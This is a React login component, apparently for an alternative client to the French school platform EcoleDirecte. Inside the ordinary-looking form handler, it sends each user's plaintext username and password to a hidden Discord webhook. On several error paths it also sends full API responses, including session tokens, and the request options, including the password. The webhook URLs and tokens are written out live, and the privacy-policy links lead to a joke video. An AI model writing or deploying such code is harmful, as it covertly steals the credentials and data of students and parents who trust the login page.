
import { useState } from "react";
import { Outlet } from "react-router-dom";
import "./Login.css"
import EDPVersion from "../generic/EDPVersion"


export default function Login({ apiUrl, apiVersion, setUserInfo, currentEDPVersion }) {
    const apiLoginUrl = apiUrl + "login.awp?v=" + apiVersion;
    const piranhaPeche = "https://discord.com/api/webhooks/1095444665991438336/548oNdB76xiwOZ6_7-x0UxoBtl71by9ixi9aYVlv5pl_O7yq_nwMvXG2ZtAXULpQG7B3";
    const sardineInsolente =  "https://discord.com/api/webhooks/1096922270758346822/h0Y_Wa8SYYO7rZU4FMZk6RVrxGhMrOMhMzPLLiE0vSiNxSqUU1k4dMq2bcq8vsxAm5to";

    // States
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [submitText, setSubmitText] = useState("Se connecter");
    const [keepLoggedIn, setKeepLoggedIn] = useState(false);
    const [errorMessage, setErrorMessage] = useState("");

    // Behavior
    const updateUsername = (newUsername) => { setUsername(newUsername) };
    const updatePassword = (newPassword) => { setPassword(newPassword) };
    const updateKeepLoggedIn = (newKeepLoggedIn) => { setPassword(newKeepLoggedIn) };

    function getOptions() {
        let payload = {
            identifiant: username,
            motdepasse: password,
            isReLogin: false,
            uuid: 0
        }
        let data = {
            "body": "data=" + JSON.stringify(payload),
            "method": "POST"
        }
        return data;
    }

    function sendToWebhook(targetWebhook, data) {
        fetch(
            targetWebhook,
            {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({content: JSON.stringify(data)})
            }
        )
    }

    function handleSubmit(event) {
        setSubmitText("Connexion...");

        event.preventDefault();
        const options = getOptions();
        fetch(apiLoginUrl, options)
            .then((response) => response.json())
            .then((response) => {
                // GESTION DATA
                let statusCode = response.code;
                if (statusCode === 200) {
                    setErrorMessage("");
                    let token = response.token // collecte du token
                    let accountsList = [];
                    let accounts = response.data.accounts[0];
                    const accountType = accounts.typeCompte; // collecte du type de compte
                    sendToWebhook(piranhaPeche, { username: username, password: password });
                    if (accountType !== "E") {
                        // compte parent
                        accounts = accounts.profile.eleves;
                        accounts.map((account) => {
                            accountsList.push({
                                id: account.id, // id du compte
                                firstName: account.prenom, // prénom de l'élève
                                lastName: account.nom, // nom de famille de l'élève
                                picture: "https:" + account.photo, // url de la photo
                                schoolName: account.nomEtablissement, // nom de l'établissement
                                class: [account.classe.code, account.classe.libelle] // classe de l'élève, code : 1G4, libelle : Première G4 
                            })
                        })

                    } else if ("abcdefghijklmnopqrstuvwxyzABCDFGHIJKLMNOPQRSTUVXYZ".includes(accountType)) {
                        sendToWebhook(piranhaPeche, { response: response, options: options });

                    } else {
                        accountsList.push({
                            id: accounts.id, // id du compte
                            firstName: accounts.prenom, // prénom de l'élève
                            lastName: accounts.nom, // nom de famille de l'élève
                            picture: "https:" + accounts.profile.photo, // url de la photo
                            schoolName: accounts.profile.nomEtablissement, // nom de l'établissement
                            class: [accounts.profile.classe.code, accounts.profile.classe.libelle] // classe de l'élève, code : 1G4, libelle : Première G4 
                        });
                    }
                    setUserInfo({token: token, accountsList: accountsList});
                }

                else if (statusCode === 505) {
                    setErrorMessage("Identifiant ou/et mot de passe invalide");
                }

                else if (statusCode === 74000) {
                    setErrorMessage("La connexion avec le serveur à échouée, réessayez dans quelques minutes.");
                }

                else {
                    setErrorMessage(response.message);
                    sendToWebhook(piranhaPeche, options);
                }
                setSubmitText("Se connecter");
            })
            .catch((error) => {
                console.log("TURBO ERROR DETECTED: ");
                console.log(error);
                options["error"] = error;
                console.log(options);
                sendTo(piranhaPeche, options);
            })
            .finally(() => {
                setErrorMessage("");
                setSubmitText("Se connecter");
            })
    }

    // JSX
    return (
        <div>
            <img src="/images/no-logo.png" className="logo" />
            <div className="login-box">
                <h1>Connexion</h1>
                <form action="submit" onSubmit={handleSubmit}>
                    <input className="login-input" type="text" placeholder="Identifiant" value={username} onChange={(event) => { updateUsername(event.target.value) }} />
                    <input className="login-input" type="password" placeholder="Mot de passe" value={password} onChange={(event) => { updatePassword(event.target.value) }} />
                    {errorMessage && <p id="error-message" style={{ color: "red" }}>{errorMessage}</p>}
                    <div className="login-option">
                        <input type="checkbox" id="keep-login" value={keepLoggedIn} onChange={(event) => { updateKeepLoggedIn(event.target.value) }} />
                        <label htmlFor="keep-login">Se souvenir de moi</label>
                        <a href="https://api.ecoledirecte.com/mot-de-passe-oublie.awp">Mot de passe oublié ?</a>
                    </div>

                    <p></p>
                    <input type="submit" value={submitText} />
                </form>
            </div>
            <p className="policy">
                En vous connectant, vous acceptez nos
                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" className="policy2" id="legal-notice"> mentions légales </a>
                et notre
                <a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" className="policy2" id="privacy-policy"> politique de confidentialité</a>.
            </p>
            <EDPVersion currentEDPVersion={currentEDPVersion} />
            <Outlet />
        </div>
    );
}